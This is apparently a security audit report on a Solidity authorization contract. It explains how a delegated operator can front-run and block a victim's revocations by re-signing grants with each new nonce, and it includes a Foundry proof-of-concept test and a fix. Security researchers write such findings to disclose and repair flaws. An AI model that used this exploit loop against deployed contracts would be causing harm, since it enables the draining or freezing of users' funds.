### Title
Authorized Delegate Can Perpetually Front-Run Revocations via EcrecoverAuthorizer Delegate-Signing Loop - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts signatures from any address that is already authorized in Midnight on behalf of the `authorizer`, not just from the `authorizer` itself. Once an attacker-controlled operator gains authorization, it can sign new grant-authorizations with each successive nonce, consuming every nonce the victim broadcasts for revocation. A smart contract victim with no direct `Midnight.setIsAuthorized` path is permanently locked out of revoking the operator.

### Finding Description
**Root cause — line 33-36 of `src/periphery/EcrecoverAuthorizer.sol`:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

Any address that `Midnight.isAuthorized[victim][signer] == true` can produce a valid `Authorization` struct with `authorizer = victim` and any future nonce. This creates a circular dependency: granting authorization to an attacker-controlled operator gives that operator the power to sign further authorizations on the victim's behalf, including re-grants that consume the exact nonce the victim is trying to use for revocation.

**Exact exploit path:**

1. Victim (smart contract, no direct `Midnight.setIsAuthorized` capability) previously signed `Authorization{authorizer=victim, authorized=operator, isAuthorized=true, nonce=0, deadline=type(uint256).max}`. Attacker holds this signature.

2. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth0, sig0)`. Passes: deadline ≥ timestamp ✓, nonce 0 == `nonce[victim]` ✓, signer == victim ✓. Result: `isAuthorized[victim][operator] = true`, `nonce[victim] = 1`.

3. Victim constructs revocation `Authorization{authorizer=victim, authorized=operator, isAuthorized=false, nonce=1, deadline=T}`, signs it, and broadcasts.

4. Attacker (controlling `operator`) sees the pending tx in the mempool. Attacker constructs `Authorization{authorizer=victim, authorized=operator, isAuthorized=true, nonce=1, deadline=T+1}`, signs it with `operator`'s key. The check at line 34 passes because `IMidnight(MIDNIGHT).isAuthorized(victim, operator) == true`. Attacker front-runs: `nonce[victim] = 2`, `isAuthorized[victim][operator]` remains `true`.

5. Victim's revocation lands with nonce=1, fails `InvalidNonce` (line 26).

6. Steps 3–5 repeat for every nonce increment. The attacker needs only one EOA key (operator) and a mempool watcher to sustain the loop indefinitely.

**Why existing checks are insufficient:**
- The nonce check (line 26) prevents replay of the *same* signature but does not prevent the attacker from consuming the *next* nonce with a freshly signed re-grant.
- The deadline check (line 25) is irrelevant; the attacker can use any future deadline.
- `Midnight.setIsAuthorized` (line 731-735) would allow direct revocation (`onBehalf == msg.sender`), but the precondition is that the victim contract has no code path to call it directly.

### Impact Explanation
The operator retains permanent `isAuthorized[victim][operator] = true` in Midnight. With this authorization the operator can call `withdraw`, `withdrawCollateral`, `repay`, `take`, `setConsumed`, and any other `onBehalf`-gated entry point on behalf of the victim. The victim's funds (collateral, withdrawable credit, pending fees) are fully accessible to the attacker and the victim has no on-chain mechanism to revoke the authorization, constituting a permanent fund freeze / fund drain.

### Likelihood Explanation
**Preconditions:**
- Victim is a smart contract whose code has no direct call to `Midnight.setIsAuthorized` (realistic for protocol integrations, smart-contract wallets, or multisigs that delegate all Midnight interaction through `EcrecoverAuthorizer`).
- Victim signed at least one authorization with `isAuthorized=true` and the attacker obtained the signature (e.g., from a public broadcast, a failed tx, or a mempool observation).
- Attacker controls the `authorized` address (operator) and can sign new `Authorization` structs with it.

All three preconditions are realistic and require no privileged access, oracle manipulation, or user mistake beyond the initial signature issuance. The front-running loop is repeatable every block at negligible gas cost for the attacker.

### Recommendation
Restrict the signer check in `EcrecoverAuthorizer.setIsAuthorized` to accept **only** the `authorizer` themselves, removing the delegate path entirely:

```solidity
// Replace lines 33-36:
require(signer == authorization.authorizer, Unauthorized());
```

If delegate signing is intentionally desired, add a separate, non-front-runnable revocation path — for example, allow the `authorizer` to increment their own nonce directly (a `cancelNonce(address authorizer)` function callable only by `authorizer == msg.sender`) so a victim can invalidate all pending attacker-held nonces atomically without going through the signature flow.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract FrontRunRevocationTest is BaseTest {
    address operator;
    uint256 operatorKey;

    function setUp() public override {
        super.setUp();
        (operator, operatorKey) = makeAddrAndKey("operator");
        // victim = borrower (smart contract stand-in with no direct Midnight access)
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
    }

    function _sign(Authorization memory auth, uint256 key) internal view returns (Signature memory) {
        bytes32 h = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 sep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, keccak256(bytes.concat("\x19\x01", sep, h)));
        return Signature(v, r, s);
    }

    function testPermanentAuthorizationFrontRun() public {
        // Step 1: victim signed a permanent grant (attacker holds it)
        Authorization memory grant = Authorization({
            authorizer: borrower,
            authorized: operator,
            isAuthorized: true,
            nonce: 0,
            deadline: type(uint256).max
        });
        Signature memory grantSig = _sign(grant, privateKey[borrower]);

        // Step 2: attacker submits the grant
        ecrecoverAuthorizer.setIsAuthorized(grant, grantSig);
        assertTrue(midnight.isAuthorized(borrower, operator));
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);

        // Step 3: victim prepares revocation at nonce=1
        Authorization memory revoke = Authorization({
            authorizer: borrower,
            authorized: operator,
            isAuthorized: false,
            nonce: 1,
            deadline: block.timestamp + 1 days
        });
        Signature memory revokeSig = _sign(revoke, privateKey[borrower]);

        // Step 4: attacker front-runs with re-grant at nonce=1, signed by operator
        // (valid because isAuthorized[borrower][operator] == true)
        Authorization memory regrant = Authorization({
            authorizer: borrower,
            authorized: operator,
            isAuthorized: true,
            nonce: 1,
            deadline: block.timestamp + 2 days
        });
        Signature memory regrantSig = _sign(regrant, operatorKey);
        ecrecoverAuthorizer.setIsAuthorized(regrant, regrantSig); // succeeds
        assertEq(ecrecoverAuthorizer.nonce(borrower), 2);
        assertTrue(midnight.isAuthorized(borrower, operator)); // still authorized

        // Step 5: victim's revocation fails — nonce already consumed
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(revoke, revokeSig);

        // Assert: victim cannot revoke; operator retains permanent authorization
        assertTrue(midnight.isAuthorized(borrower, operator));
    }
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.setIsAuthorized(regrant, regrantSig)` succeeds (attacker consumes nonce 1 with operator key).
- `ecrecoverAuthorizer.setIsAuthorized(revoke, revokeSig)` reverts with `InvalidNonce`.
- `midnight.isAuthorized(borrower, operator)` remains `true` after the victim's revocation attempt.
